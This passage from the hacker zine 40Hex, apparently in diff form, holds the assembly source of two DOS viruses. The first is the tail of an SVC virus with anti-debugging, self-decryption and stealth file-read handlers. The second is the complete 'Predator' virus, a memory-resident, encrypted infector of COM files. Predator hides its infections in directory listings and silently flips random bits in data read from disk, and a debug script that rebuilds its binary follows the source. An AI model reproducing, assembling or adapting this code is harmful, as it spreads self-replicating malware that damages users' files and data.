+                cmp     word ptr ds:1*4,offset int1 ; int 1 changed?
+                jne     int8setint1                 ; fix it if so
+                mov     ax,cs
+                cmp     word ptr ds:1*4+2,ax
+                jne     int8setint1
+int8checkint3:
+                cmp     word ptr ds:3*4,offset int3 ; int 3 changed?
+                jne     int8setint3                 ; fix it if so
+                mov     ax,cs
+                cmp     word ptr ds:3*4+2,ax
+                jne     int8setint3
+exitint8:
+                popf
+                pop     ds
+                pop     ax
+                jmp     dword ptr cs:oldint8
+
+int8setint1:
+                push    es
+                les     ax,dword ptr ds:1*4
+                mov     cs:oldint1,ax
+                mov     word ptr cs:oldint1+2,es
+                mov     word ptr ds:1*4,offset int1
+                mov     word ptr ds:1*4+2,cs
+                pop     es
+                jmp     short int8checkint3
+int8setint3:
+                push    es
+                les     ax,dword ptr ds:3*4
+                mov     cs:oldint3,ax
+                mov     word ptr cs:oldint3+2,es
+                mov     word ptr ds:3*4,offset int3
+                mov     word ptr ds:3*4+2,cs
+                pop     es
+                jmp     short exitint8
+
+int3:                                           ; reboot if debugger
+                push    bp                      ; is active
+                push    ax
+                mov     bp,sp
+                add     bp,6
+                mov     bp,[bp]
+                mov     ax,cs
+                cmp     bp,ax
+                pop     ax
+                pop     bp
+                jz      reboot
+                jmp     dword ptr cs:oldint3
+
+exitint1:
+                iret
+
+int1:
+                push    bp                      ; this routine doesn't
+                push    ax                      ; do very much that's
+                mov     bp,sp                   ; meaningful
+                add     bp,6
+                mov     bp,[bp]
+                mov     ax,cs
+                cmp     bp,ax
+                pop     ax
+                pop     bp
+                jz      exitint1
+                jmp     dword ptr cs:oldint1
+reboot:
+                db      0EAh                    ; jmp F000:FFF0
+                db      0F0h, 0FFh, 0, 0F0h     ; (reboot)
+
+decrypt:
+                push    bx
+                push    es
+                call    decrypt_next
+decrypt_next:
+                pop     bx
+                mov     byte ptr cs:[bx+16h],32h ; inc sp -> xor al,ah
+                nop
+                mov     byte ptr cs:[bx+19h],2   ; add dh,ah -> add ah,dh
+                nop
+                push    ds
+                pop     es
+                mov     di,si
+                mov     cx,18h
+                cld
+decrypt_loop:
+                lodsb
+                db      0FFh, 0C4h              ; inc sp
+                stosb
+                db      0, 0E6h                 ; add dh,ah
+                loop    decrypt_loop
+
+                mov     byte ptr cs:[bx+16h],0FFh ; change back to inc sp
+                mov     byte ptr cs:[bx+19h],0    ; and add dh,ah -- why?
+                pop     es
+                pop     bx
+                retn
+
+handlegoEOF:
+                popf
+                cmp     cs:filehand,bx          ; currently working on this?
+                jne     handlegoEOFexit
+                mov     cs:tempstoreDX,dx       ; save offset from EOF
+                mov     cs:tempstoreCX,cx
+                xor     cx,cx
+                xor     dx,dx
+                call    callint21               ; go to EOF
+                sub     ax,viruslength          ; shrink to carrier size
+                sbb     dx,0
+                mov     cx,ax
+                xchg    cx,dx
+                add     dx,cs:tempstoreDX       ; add offset from carrier
+                adc     cx,cs:tempstoreCX       ; EOF
+                mov     ax,4200h                ; and do it
+handlegoEOFexit:
+                jmp     dword ptr cs:oldint21
+
+handleopen2:
+                call    dword ptr cs:oldint21
+                pushf
+                push    ax
+                push    bx
+                push    cx
+                push    dx
+                push    di
+                push    si
+                push    ds
+                push    es
+                jc      handleopen2_exit
+                cmp     cs:filehand,0
+                jne     handleopen2_exit
+                push    ax
+                mov     bx,ax
+                call    checkifinfected
+                pop     ax
+                jc      handleopen2_alreadyinfected
+                mov     cs:filehand,ax          ; save file handle for
+                mov     bx,ax                   ; later use
+                mov     ax,4202h                ; go to end of file
+                xor     cx,cx                   ; to find file size
+                xor     dx,dx
+                call    callint21
+                sub     ax,viruslength          ; calculate carrier
+                sbb     dx,0                    ; size and store it
+                mov     cs:carrierEOFhi,dx
+                mov     cs:carrierEOFlo,ax
+handleopen2_alreadyinfected:
+                xor     cx,cx                   ; go to start of file
+                xor     dx,dx
+                mov     ax,4200h
+                call    callint21
+handleopen2_exit:
+                pop     es
+                pop     ds
+                pop     si
+                pop     di
+                pop     dx
+                pop     cx
+                pop     bx
+                pop     ax
+exit_replaceflags:
+                popf
+                pop     cs:storesIP
+                pop     cs:storesCS
+                pop     cs:returnFlags
+                pushf
+                push    cs:storesCS
+                push    cs:storesIP
+                iret
+handleread_exit:
+                jmp     handleread__exit
+
+handleread:
+                call    dword ptr cs:oldint21   ; prechain
+                pushf
+                push    ax
+                push    cx
+                push    dx
+                push    ds
+                push    di
+                push    si
+                push    es
+                jc      handleread_exit         ; exit on error
+                cmp     cs:filehand,0
+                je      handleread_exit
+                cmp     cs:filehand,bx
+                jne     handleread_exit
+                mov     cs:bufferoff,dx
+                mov     cs:bufferseg,ds
+                mov     cs:bytesread,ax
+                xor     cx,cx                   ; get current file position
+                xor     dx,dx
+                mov     ax,4201h
+                call    callint21
+                jc      handleread_exit
+                sub     ax,cs:bytesread         ; find pre-read location
+                sbb     dx,0                    ; to see if need to
+                mov     cs:origposhi,dx         ; redirect it
+                mov     cs:origposlo,ax
+                mov     ax,4202h                ; go to end of file
+                xor     cx,cx
+                xor     dx,dx
+                call    callint21
+                sub     ax,viruslength
+                sbb     dx,0
+                mov     cs:carrierEOFlo,ax
+                mov     cs:carrierEOFhi,dx
+                cmp     cs:origposhi,0          ; check if read was
+                jne     handleread_notinheader  ; from the header
+                cmp     cs:origposlo,18h
+                jb      handleread_inheader
+handleread_notinheader:
+                mov     cx,cs:origposhi         ; check if read extended
+                mov     dx,cs:origposlo         ; into the virus
+                add     dx,cs:bytesread
+                adc     cx,0
+                cmp     cx,cs:carrierEOFhi
+                jb      handleread_notinvirus
+                ja      handleread_invirus
+                cmp     dx,cs:carrierEOFlo
+                ja      handleread_invirus
+handleread_notinvirus:
+                mov     cx,cs:origposhi         ; return to proper file
+                mov     dx,cs:origposlo         ; position
+                add     dx,cs:bytesread
+                adc     cx,0
+                mov     ax,4200h
+                call    callint21
+handleread__exit:
+                pop     es
+                pop     si
+                pop     di
+                pop     ds
+                pop     dx
+                pop     cx
+                pop     ax
+                jmp     exit_replaceflags
+handleread_invirus:
+                jmp     handleread__invirus
+handleread_inheader:
+                cmp     cs:bytesread,0
+                je      handleread_notinheader
+                mov     cx,cs:carrierEOFhi
+                mov     dx,cs:carrierEOFlo
+                add     dx,offset savebuffer
+                adc     cx,0
+                mov     ax,4200h
+                call    callint21
+                jc      handleread_notinheader
+                push    ds
+                pop     es
+                push    cs
+                pop     ds
+                mov     dx,offset savebuffer
+                mov     ah,3Fh                  ; Read header
+                mov     cx,18h
+                call    callint21
+                jc      handleread_notinheader
+                cmp     ax,18h
+                jne     handleread_notinheader
+                mov     cx,cs:carrierEOFhi      ; go to decryption values
+                mov     dx,cs:carrierEOFlo
+                add     dx,offset encryptval1
+                adc     cx,0
+                mov     ax,4200h
+                call    callint21
+                mov     ah,3Fh                  ; read decryption values
+                mov     cx,2
+                mov     dx,offset encryptval1
+                call    callint21
+                jc      handleread_inheader_error
+                mov     si,offset savebuffer
+                mov     ah,byte ptr cs:encryptval1
+                mov     dh,byte ptr cs:encryptval2
+                call    decrypt
+                mov     cx,cs:origposlo
+                neg     cx
+                add     cx,18h
+                cmp     cx,cs:bytesread
+                jb      handleread_inheader_noadjust
+                mov     cx,cs:bytesread
+handleread_inheader_noadjust:
+                mov     si,offset savebuffer    ; copy previously read
+                add     si,cs:origposlo         ; stuff if necessary
+                mov     di,cs:bufferoff
+                mov     es,cs:bufferseg
+                cld
+                cmp     cx,0
+                je      handleread_inheader_nomove
+                rep     movsb
+handleread_inheader_nomove:
+                jmp     handleread_notinheader
+handleread_inheader_error:
+                jmp     handleread_notinheader
+handleread__invirus:
+                mov     cx,cs:origposhi
+                cmp     cx,cs:carrierEOFhi
+                ja      handleread__invirus_gocarrierEOF
+                jc      handleread__invirus_readpart
+                mov     cx,cs:origposlo
+                cmp     cx,cs:carrierEOFlo
+                jb      handleread__invirus_readpart
+handleread__invirus_gocarrierEOF:
+                mov     cx,cs:origposhi
+                mov     dx,cs:origposlo
+                mov     ax,4200h
+                call    callint21
+                xor     ax,ax
+handleread__invirus_exit:
+                pop     es
+                pop     si
+                pop     di
+                pop     ds
+                pop     dx
+                pop     cx
+                pop     cs:returnFlags
+                jmp     exit_replaceflags
+handleread__invirus_readpart:
+                mov     cx,cs:carrierEOFhi      ; read portion of
+                mov     dx,cs:carrierEOFlo      ; file up to virus
+                mov     ax,4200h
+                call    callint21
+                sub     ax,cs:origposlo
+                jmp     short handleread__invirus_exit
+handlewrite:
+                cmp     bx,0
+                je      handlewrite_exit
+                cmp     bx,cs:filehand
+                jne     handlewrite_exit
+                mov     ax,4201h                ; get current position
+                xor     cx,cx                   ; in the file
+                xor     dx,dx
+                call    callint21
+                jc      handlewrite_exit
+                mov     cs:curposlo,ax
+                mov     cs:curposhi,dx
+                mov     ax,4202h                ; go to end of file
+                xor     cx,cx                   ; to find the filesize
+                xor     dx,dx
+                call    callint21
+                mov     cs:filesizelo,ax
+                mov     cs:filesizehi,dx
+                call    disinfect               ; disinfect the file
+                jc      handlewrite_done
+                cmp     cs:handletoinfect,0
+                jne     handlewrite_done
+                mov     cs:handletoinfect,bx
+                mov     cs:filehand,0
+handlewrite_done:
+                mov     dx,cs:curposlo          ; return to original
+                mov     cx,cs:curposhi          ; position
+                mov     ax,4200h
+                call    callint21
+handlewrite_exit:
+                jmp     exitint21
+
+terminate:
+                mov     cs:chkdskflag,0
+                jmp     exitint21
+
+check_chkdsk:
+                mov     si,dx
+                cld
+check_chkdsk_loop1:
+                lodsw
+                cmp     ah,0
+                je      check_chkdsk_exit
+                cmp     ax,'HC'
+                je      check_chkdsk_loop2
+                cmp     ax,'hc'
+                je      check_chkdsk_loop2
+                dec     si
+                jmp     short check_chkdsk_loop1
+check_chkdsk_exit:
+                retn
+check_chkdsk_loop2:
+                push    si
+                lodsw
+                cmp     ax,'DK'
+                pop     si
+                jz      check_chkdsk_found
+                cmp     ax,'dk'
+                je      check_chkdsk_found
+                dec     si
+                jmp     short check_chkdsk_loop1
+check_chkdsk_found:
+                mov     cs:chkdskflag,1
+                retn
+
+getsetfiletime:
+                cmp     al,0                    ; get file tiem?
+                jne     getsetfiletime_exit     ; nope, exit
+                call    dword ptr cs:oldint21   ; prechain
+                pushf
+                and     cx,1Eh                  ; if (seconds == 60)
+                cmp     cx,1Eh                  ; then xor with 60h
+                jne     getsetfiletime_nofix    ; to hide the change
+                xor     cx,1Eh                  ; otherwise, don't
+getsetfiletime_nofix:
+                jmp     exit_replaceflags
+getsetfiletime_exit:
+                popf
+                jmp     dword ptr cs:oldint21
+
+                db      '(c) 1990 by SVC,Vers. '
+
+
+
+infection_marker db      '5.0 ',0
+
+begindata:
+oldint1         dw      0, 0
+oldint3         dw      0, 0
+oldint8         dw      0, 0
+oldint21        dw      0, 0
+savebuffer      dw      20CDh
+                dw      11 dup (0)
+tickcount       db      0
+carrierPSP      dw      0
+origposlo       dw      0
+origposhi       dw      0
+carrierEOFlo    dw      0
+carrierEOFhi    dw      0
+bytesread       dw      0
+bufferoff       dw      0
+bufferseg       dw      0
+tempstoreCX     dw      0
+tempstoreDX     dw      0
+filehand        dw      0
+fileattr        dw      0
+filetime        dw      0
+filedate        dw      0
+chkdskflag      dw      0
+oldint24        dw      0, 0
+oldint23        dw      0, 0
+handletoinfect  dw      0
+storesIP        dw      0
+storesCS        dw      0
+returnFlags     dw      0
+filesizelo      dw      0
+filesizehi      dw      0
+curposlo        dw      0
+curposhi        dw      0
+workbuffer      dw      12 dup (0)
+storeAX         dw      0
+                db      0
+storess         dw      0
+storesp         dw      0
+int21command    dw      0
+encryptval1     db      0
+encryptval2     db      0
+                dw      1990h ; written 1990
+versionbyte     db      50h   ; version 5.0
+
+endvirus        =       $
+viruslength     =       $ - start
+                end     start
+-------------------------------------------------------------------------------
+
+40Hex Issue 11 Volume 3 Number 2                                      File 008
+
+                                   Predator
+
+     Predator is a virus written by Phalcon/Skism's newest member, Priest.  It
+incorporates a number of stealth features.  It infects only COM files.
+Predator uses the "Century" technique of marking a virus infection; file dates
+are bumped up 100 years to designate an infection.
+
+--Predator Source Code---------------------------------------------------------
+CSEG SEGMENT
+     ASSUME CS:CSEG, ES:CSEG, SS:CSEG
+     ORG 0h
+
+;                        Source code of the Predator
+
+;                                  Priest
+
+
+Its_Me          equ 'IM'
+
+Read_Only       equ 1
+
+Mem_Size        equ offset Finish-offset Virus_Start    ;amount of memory needed
+                                                        
+Virus_Size      equ offset Virus_End-offset Virus_Start ;size of virus
+New_Virus_Size  equ offset Finish-offset New_Virus      ;size of virus w/
+                                                        ;encryption
+
+
+Hundred_Years   equ 0c8h
+
+Version         equ 30h                   ;Get DOS Version
+Open            equ 3dh                   ;Open File
+Ext_Open        equ 6ch                   ;Extended Open File
+Execute         equ 4bh                   ;Execute
+Find_FCB        equ 11h                   ;Find File Control Block
+Find_FCB_Next   equ 12h                   ;Find next FCB
+Open_FCB        equ 0fh                   ;Open FCB
+Get_DTA         equ 2fh                   ;Get DTA address
+Find_Dir        equ 4eh                   ;Find file
+Find_Dir_Next   equ 4fh                   ;Find next file
+
+Attribute       equ 1                     ;infection flags
+Opened          equ 2
+Written         equ 4
+
+Extended_FCB    equ 0ffh                  ;Extended FCB will have the first
+                                          ;byte equal to FFh
+
+Virus_Start:    mov sp,bp                 ;restore Stack after decryption
+                sti                       ;interrupts on
+                mov ah,Version
+                mov bx,Its_Me
+                int 21h                   ;Check if already resident
+                cmp ax,Its_Me
+                jne Go_Res
+Jump_R_F:       jmp Return_File
+Go_Res:         mov ax,cs                 
+                dec ax                    ;get segment of this MCB
+MCB_ds:         mov ds,ax
+                cmp byte ptr ds:[0],'Z'   ;must be last Memory Control Block
+                jne Jump_R_F
+Found_last_MCB: mov ax,Mem_Size           ;Reserve enough for virus + data
+                mov cl,4h                 
+                shr ax,cl                 ;convert to paragraphs
+                inc ax
+                push ax
+                dec ax
+                shr ax,cl
+                shr cl,1
+                shr ax,cl                 ;convert to kilobytes
+                inc ax                    
+                push ds
+                xor bx,bx
+                mov ds,bx
+                sub word ptr ds:[413h],ax  ;take memory from int 12
+                pop ds
+                pop ax
+                sub word ptr ds:[0003h],ax  ;take it from availible memory
+                mov ax,cs
+                add ax,ds:[0003h]         ;get segment of free memory
+                mov es,ax
+                push cs
+                pop ds
+                call $+3             ;next 3 instructions find Virus_Start
+                pop si
+                sub si,(offset $-1)-offset Virus_Start
+                xor di,di
+                mov cx,Mem_Size
+                cld
+                rep movsb                 ;copy us to High Memory
+                push es
+                mov ax,offset High_Start
+                push ax
+                retf                      ;jump up there
+
+Virus_Name:     db 'Predator virus  ' 
+Copyright:      db '(c) Mar. 93  '
+Me:             db 'Priest' 
+
+File_Bytes      db 0cdh, 20h, 0h       ;first 3 bytes of infected .com file
+
+Com_Spec:       db '.COM',0h           ;only .com files can be infected
+
+High_Start:     push cs
+                pop ds
+                mov ax,3521h           ;get address of Int 21
+                int 21h
+                mov word ptr ds:[Int_21],bx      ;save it 
+                mov word ptr ds:[Int_21+2h],es
+                mov al,13h              ;get address of Int 13
+                int 21h
+                mov word ptr ds:[Int_13],bx     ;save it
+                mov word ptr ds:[Int_13+2h],es
+                mov ah,25h                   ;point Int 13 to our handler
+                mov dx,offset New_13
+                int 21h
+                mov al,21h                   ;21h too
+                mov dx,offset New_21
+                int 21h   
+                xor ax,ax
+                mov ds,ax
+                mov ax,ds:[46ch]             ;get a random number for 
+                push cs                      ; activation task
+                pop ds
+                xchg al,ah
+                add word ptr ds:[Count_Down],ax     ;Save it for count down
+Return_File:    push ss
+                pop es
+                mov di,100h
+                call $+3      ;get address of first 3 bytes of .com file
+                pop si
+                sub si,(offset $-1)-offset File_Bytes
+                push ss
+                push di
+                cld
+                movsw                           ;move them
+                movsb
+                push ss
+                pop ds
+                xor ax,ax
+                retf                           ;jump to original program
+
+
+
+New_21:         cmp ah,Open                    ;check function
+                je Infect
+                cmp ah,Ext_Open
+                je Ext_File_Open
+                cmp ah,Execute
+                je Infect
+                cmp ah,Find_FCB
+                je Stealth_FCB
+                cmp ah,Find_FCB_Next
+                je Stealth_FCB
+                cmp ah,Open_FCB
+                je Stealth_FCB_O
+                cmp ah,Find_Dir
+                je Stealth_Dir
+                cmp ah,Find_Dir_Next
+                je Stealth_Dir
+                cmp ah,Version         ;other checking for us
+                jne Jump_21
+                cmp bx,Its_Me
+                jne Jump_21
+                mov ax,bx               ;tell other that we're here
+Ret_21:         retf 0002h
+Jump_21:        jmp cs:Int_21
+
+Stealth_Dir:    jmp Hide_Find
+Stealth_FCB:    jmp Hide_FCB
+Stealth_FCB_O:  jmp Hide_FCB_O
+
+Infect_Error_J: jmp Infect_Error
+Ext_File_Open:  mov word ptr cs:[File_Pnt],si     ;Extended open uses DS:SI
+                jmp short Infect_ds
+Infect:         mov word ptr cs:[File_Pnt],dx   ;Open & Execute use DS:DX
+Infect_ds:      mov word ptr cs:[File_Pnt+2h],ds
+                mov byte ptr cs:[Infect_Status],0h  ;zero out progress byte
+                call Push_All                    ;Push all registers
+                call Hook_24    ;Hook Int 24 to avoid errors being displayed
+                call Is_Com                ;Is it a .com file?
+                jb Infect_Error_J          ;Carry flag set if it is not
+                lds dx,cs:[File_Pnt]       ;get saved address of file name
+                mov ax,4300h             ;fetch the attribute
+                push ax
+                call Old_21
+                pop ax
+                jb Infect_Error_J
+                mov byte ptr cs:[File_Attr],cl  ;save attribute
+                test cl,Read_Only   ;no need to change if not read only
+                je No_Attr_Rem
+                xor cx,cx
+                inc al
+                call Old_21                 ;if read only, then zero out
+                jb Infect_Error_J
+                or byte ptr cs:[Infect_Status],Attribute ;update progress byte
+No_Attr_Rem:    mov ax,3dc2h              ;open with write/compatibility
+                call Old_21
+                jb Infect_Error_J
+                xchg ax,bx                ;handle into bx
+                push cs
+                pop ds
+                or byte ptr ds:[Infect_Status],Opened ;update progress byte
+                mov ax,5700h                      ;get date
+                call Old_21
+                cmp dh,Hundred_Years            ;is it infected?
+                jnb Infect_Error
+                add dh,Hundred_Years            ;else add 100 years to date
+                mov word ptr ds:[File_Date],dx  ;save modified date
+                mov word ptr ds:[File_Time],cx
+                mov ah,3fh                      ;read first 3 bytes
+                mov cx,3h
+                mov dx,offset File_Bytes
+                call Old_21
+                cmp ax,cx                     ;if error, then quit
+                jne Infect_Error
+                cmp word ptr ds:[File_Bytes],'MZ' ;no .exe files 
+                je Infect_Error
+                cmp word ptr ds:[File_Bytes],'ZM'
+                je Infect_Error
+                mov al,2                ;set file pointer to end of file
+                call Set_Pnt
+                or dx,dx                ;too big?
+                jne Infect_Error
+                cmp ax,1000             ;too small?
+                jb Infect_Error
+                cmp ax,0-2000           ;still too big?
+                ja Infect_Error
+                mov di,offset Jump_Bytes    ;make a jump to end of file
+                push ax
+                add ax,100h          ;these two are for the encryption
+                mov word ptr ds:[Decrypt_Start_Off+1],ax
+                push cs
+                pop es
+                mov al,0e9h           ;e9h = JMP xxxx
+                cld
+                stosb
+                pop ax
+                sub ax,3h             ; to end of file
+                stosw
+                call Encrypt_Virus    ;encrypt the virus
+                mov ah,40h            ;write the encrypted virus and the
+                                      ;decryption routine to file
+                mov dx,offset New_Virus
+                mov cx,New_Virus_Size
+                call Old_21
+                jb Infect_Error
+                or byte ptr ds:[Infect_Status],Written ;update progress byte
+                xor al,al                              ;set file pointer to 
+                call Set_Pnt                           ;beginning of file
+                mov ah,40h                             ;write the jump
+                mov dx,offset Jump_Bytes
+                mov cx,3h
+                call Old_21
+Infect_Error:   test byte ptr cs:[Infect_Status],Opened ;was file opened?
+                je Set_Attr
+                test byte ptr cs:[Infect_Status],Written ;was file written to?
+                je Close
+                mov ax,5701h            ;if infected, restore modified date
+                mov dx,cs:[File_Date]
+                mov cx,ds:[File_Time]
+                call Old_21
+Close:          mov ah,3eh                ;close file
+                call Old_21
+Set_Attr:       test byte ptr cs:[Infect_Status],Attribute ;attribute changed?
+                je Jump_Old_21
+                mov ax,4301h              ;if changed, then restore it
+                xor cx,cx
+                mov cl,cs:[File_Attr]
+                lds dx,cs:[File_Pnt]
+                call Old_21
+Jump_Old_21:    call Unhook_24           ;unhook Int 24
+                call Pop_All             ;pop all registers
+                jmp Jump_21              ;jump to original int 21
+
+Set_Pnt:        mov ah,42h               ;set file pointer w/ al as parameter
+                xor cx,cx
+                cwd                      ;zero out dx
+                call Old_21
+                retn
+
+
+Pop_All:        pop word ptr cs:[Ret_Add]  ;save return address
+                pop es
+                pop ds
+                pop si
+                pop di
+                pop bp
+                pop dx
+                pop cx
+                pop bx
+                pop ax
+                popf
+                jmp cs:[Ret_Add]          ;jump to return address
+
+Push_All:       pop word ptr cs:[Ret_Add] ;save return address
+                pushf
+                push ax
+                push bx
+                push cx
+                push dx
+                push bp
+                push di
+                push si
+                push ds
+                push es
+                jmp cs:[Ret_Add]       ;jump to return address
+
+
+Hook_24:        call Push_All          ;push all registers
+                mov ax,3524h           ;get int 24 address
+                call Old_21
+                mov word ptr cs:[Int_24],bx   ;save address
+                mov word ptr cs:[Int_24+2h],es
+                mov ah,25h                     ;set new address to us
+                push cs
+                pop ds
+                mov dx,offset New_24
+                call Old_21
+                call Pop_All           ;pop all registers
+                retn
+
+Unhook_24:      call Push_All
+                mov ax,2524h          ;set old address back
+                lds dx,cs:[Int_24]
+                Call Old_21
+                call Pop_All
+                retn
+
+New_24:         mov al,3h          ;int 24, fail
+                iret
+
+Old_21:         pushf              ;call to original int 21
+                call cs:Int_21
+                retn
+
+;Hide_Find hides the file size increase for functions 4eh and 4fh and the
+;date change
+
+
+Hide_Find:      call Old_21         ;do the search
+                call Push_All       ;push all registers
+                jb Hide_File_Error
+                mov ah,2fh          ;get DTA address
+                call Old_21
+                cmp byte ptr es:[bx.DTA_File_Date+1h],Hundred_Years  ;Is it
+                jb Hide_File_Error                              ;infected?
+                sub byte ptr es:[bx.DTA_File_Date+1h],Hundred_Years ;Take
+                                        
+                                        ;away 100 years from date
+                
+                sub word ptr es:[bx.DTA_File_Size],New_Virus_Size   ;take
+                                        
+                                        ;away Virus_Size from file size
+
+                sbb word ptr es:[bx.DTA_File_Size+2],0    ;subtract remainder
+                                        
+                                        ;although there will not be one
+                                        ; I included it for expandibility 
+                                        ; (i.e. infecting .exe files)
+Hide_File_Error:call Pop_All            ;pop all registers
+                jmp Ret_21
+
+;Hide_FCB hides the file size increase for functions 11h and 12h and the
+;date change
+
+
+Hide_FCB:       call Old_21        ;find file
+                call Push_All      ;push registers
+                or al,al           ;al=0 if no error
+                jne Hide_FCB_Error
+                mov ah,Get_DTA     ;get address of DTA
+                call Old_21
+                cmp byte ptr ds:[bx],Extended_FCB   ;is it an extended FCB?
+                jne Hide_FCB_Reg
+                add bx,7h            ;yes, add 7 to address to skip garbage
+
+Hide_FCB_Reg:   cmp byte ptr es:[bx.DS_Date+1h],Hundred_Years ;Is it infected?
+                jb Hide_FCB_Error
+                sub byte ptr es:[bx.DS_Date+1h],Hundred_Years  ;yes, restore
+                                                ;date
+
+                sub word ptr es:[bx.DS_File_Size],New_Virus_Size ;fix size
+                sbb word ptr es:[bx.DS_File_Size+2],0  ;and remainder
+Hide_FCB_Error: call Pop_All                    ;pop all registers
+                jmp Ret_21
+
+;Hide_FCB_O hides the file size increase for function 0fh and the
+;date change
+
+Hide_FCB_O:     call Old_21               ;open FCB 
+                call Push_All             ;push all registers
+                cmp al,0h                 ;al=0 if opened, else error
+                jne Hide_FCB_O_Error
+                mov bx,dx                 ;pointer into bx
+
+                cmp byte ptr ds:[bx],Extended_FCB ;is it an extended FCB?
+                jne Hide_FCB_No_E
+                add bx,7h            ;yes, add 7 to skip garbage
+
+Hide_FCB_No_E:  cmp byte ptr ds:[bx.FCB_File_Date+1h],Hundred_Years ;infected?
+                jb Hide_FCB_O_Error
+                sub byte ptr ds:[bx.FCB_File_Date+1h],Hundred_Years ;yes,
+                                                ;fix date
+
+                sub word ptr ds:[bx.FCB_File_Size],New_Virus_Size ;fix size
+                sbb word ptr ds:[bx.FCB_File_Size+2h],0  ;and remainder
+Hide_FCB_O_Error:call Pop_All         ;pop all registers
+                jmp Ret_21
+
+Is_Com:         push cs
+                pop ds
+                les di,ds:[File_Pnt]  ;get address of file
+                xor al,al
+                mov cx,7fh
+                cld
+                repne scasb           ;scan for null byte at end of file name
+                cmp cx,7fh-5h        ;must be at least 5 bytes long, 
+                                     ;including ext. (.COM)
+                jnb Is_Not_Com
+                mov cx,5h            ;compare last five bytes to ".COM",0
+                sub di,cx
+                mov si,offset Com_Spec  ;offset of ".COM",0
+                cld
+                rep cmpsb             ;compare them
+                jne Is_Not_Com
+                clc                   ;if .com file, then clear carry flag
+                retn
+Is_Not_Com:     stc                   ;else set it
+                retn
+
+;This is the interrupt 13 handle, it's sole purpose is to complement a
+;random bit after a random number of sectors (1-65535) have been read.
+
+
+New_13:         cmp ah,2h             ;Is a sector going to be read
+                je Read_Sector
+Jump_13:        jmp cs:Int_13         ;no, continue on
+Ret_13:         call Pop_All          ;pop all registers
+                retf 0002h
+Read_Sector:    mov byte ptr cs:[Sub_Value],al  ;save number of sectors read
+                pushf
+                call cs:Int_13                  ;read the sectors
+                call Push_All                   ;push flags
+                jb Ret_13                       ;jump if error to return
+                mov al,cs:[Sub_Value]           ;get number of sectors read
+                cbw
+                sub word ptr cs:[Count_Down],ax ;subtract it from our count
+                ja Ret_13                       ;down
+                mov bx,200h                     ;200h bytes per sector
+                cwd                             ;zero dx
+                mul bx                          ;mul # of sectors by 200
+                dec ax                          ;minus one
+                xor cx,cx
+                mov ds,cx
+                mov cx,ds:[46ch]                ;get random value
+                mov word ptr cs:[Count_Down],cx ;move it into count down
+                push cx
+                and cx,ax                       ;cx must be < ax
+                add bx,cx                       ;add it to the address of 
+                pop cx                          ;where the sectors were read
+                add cl,ch                       ;randomize cl
+                rcr word ptr es:[bx],cl         ;get a random bit
+                cmc                             ;reverse it
+                rcl word ptr es:[bx],cl         ;put it back
+                jmp short Ret_13                ;jump to return 
+
+;The Encrypt_Virus module copies the decryption routine and an encrypted
+;copy of the virus to a buffer
+
+Encrypt_Virus:  xor ax,ax
+                mov ds,ax
+                mov ax,ds:[46ch]    ;get random value
+                push cs
+                pop ds
+                add byte ptr ds:[Decrypt_Value],al    ;use as encryption key 
+                mov al,ds:[Decrypt_Value]             ;get encryption key
+                add ah,al                             ;randomize ah
+                add byte ptr ds:[Decrypt_Random],ah   ;put random garbage 
+                mov si,offset Decrypt_Code          ;copy decryption routine
+                mov di,offset New_Virus
+                mov cx,offset Decrypt_End-offset Decrypt_Code
+                cld
+                rep movsb                           ;to buffer    
+                mov si,offset Virus_Start           ;copy virus
+                mov cx,((Virus_Size)/2)+1
+Encrypt_Loop:   xchg ax,cx
+                push ax
+                lodsw
+                rol ax,cl                           ;and encrypt
+                not ax
+                stosw                               ;to buffer
+                pop ax
+                xchg ax,cx
+                loop Encrypt_Loop
+                dec di                              ;fix pointer for
+                dec di                              ;decryption routine
+                sub di,offset New_Virus     ;point decryption's SP to end of
+                                            ;encrypted code for proper
+                                            ;decryption
+
+                add word ptr ds:[New_Virus+(Decrypt_Start_Off+1-Decrypt_Code)],di
+                retn
+
+;Decryption routine
+
+Decrypt_Code:   mov dx,((Virus_Size)/2)+1
+                db 0b1h                    ;mov cl,
+Decrypt_Value   db ?                    
+                cli
+                mov bp,sp
+Decrypt_Start_Off:mov sp,1234h
+Decrypt_Loop:   pop ax
+                not ax
+                ror ax,cl
+                push ax
+                jmp short $+3
+Decrypt_Random: db 12h
+                dec sp
+                dec sp
+                dec dx
+                jne Decrypt_Loop
+Decrypt_End:
+
+                db ?
+Virus_End:
+
+Jump_Bytes      db 3 dup(0)
+
+Int_13          dd ?                    
+Int_21          dd ?
+Int_24          dd ?
+
+Ret_Add         dw ?                    
+
+File_Pnt        dd ?
+
+Infect_Status   db ?
+
+File_Time       dw ?
+File_Date       dw ?
+File_Attr       db ?
+
+Count_Down      dw ?
+Sub_Value       db ?
+
+New_Virus       db Virus_Size+(offset Decrypt_End-offset Decrypt_Code)+1 dup(0)
+                
+Finish:
+
+;various structures
+
+Directory       STRUC
+DS_Drive        db ?
+DS_File_Name    db 8 dup(0)
+DS_File_Ext     db 3 dup(0)
+DS_File_Attr    db ?
+DS_Reserved     db 10 dup(0)
+DS_Time         dw ?
+DS_Date         dw ?
+DS_Start_Clust  dw ?
+DS_File_Size    dd ?
+Directory       ENDS
+
+FCB             STRUC
+FCB_Drive       db ?
+FCB_File_Name   db 8 dup(0)
+FCB_File_Ext    db 3 dup(0)
+FCB_Block       dw ?
+FCB_Rec_Size    dw ?
+FCB_File_Size   dd ?
+FCB_File_Date   dw ?
+FCB_File_Time   dw ?
+FCB_Reserved    db 8 dup(0)
+FCB_Record      db ?
+FCB_Random      dd ?
+FCB             ENDS
+
+DTA             STRUC
+DTA_Reserved    db 21 dup(0)
+DTA_File_Attr   db ?
+DTA_File_Time   dw ?
+DTA_File_Date   dw ?
+DTA_File_Size   dd ?
+DTA_File_Name   db 13 dup(0)
+DTA             ENDS
+
+
+
+
+
+CSEG ENDS
+     END Virus_Start
+--Predator Debug Script--------------------------------------------------------
+n predator.com
+e 0100  8B E5 FB B4 30 BB 4D 49 CD 21 3D 4D 49 75 03 E9 
+e 0110  AF 00 8C C8 48 8E D8 80 3E 00 00 5A 75 F1 B8 64 
+e 0120  08 B1 04 D3 E8 40 50 48 D3 E8 D0 E9 D3 E8 40 1E 
+e 0130  33 DB 8E DB 29 06 13 04 1F 58 29 06 03 00 8C C8 
+e 0140  03 06 03 00 8E C0 0E 1F E8 00 00 5E 81 EE 4B 00 
+e 0150  33 FF B9 64 08 FC F3 A4 06 B8 89 00 50 CB 50 72 
+e 0160  65 64 61 74 6F 72 20 76 69 72 75 73 20 20 28 63 
